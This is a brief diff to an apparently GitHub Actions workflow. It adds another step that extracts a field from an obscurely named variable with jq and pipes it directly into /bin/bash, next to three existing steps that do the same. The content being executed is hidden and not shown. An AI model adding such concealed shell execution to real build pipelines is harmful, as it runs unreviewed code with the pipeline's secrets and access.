@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$eu1532" | jq -r .cz891 | /bin/bash
           echo $q0 | jq -r .ttjt3538 | /bin/bash
           echo $p644 | jq -r .mw9 | /bin/bash
+          printf '%s' "$k8102" | jq -r .x0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
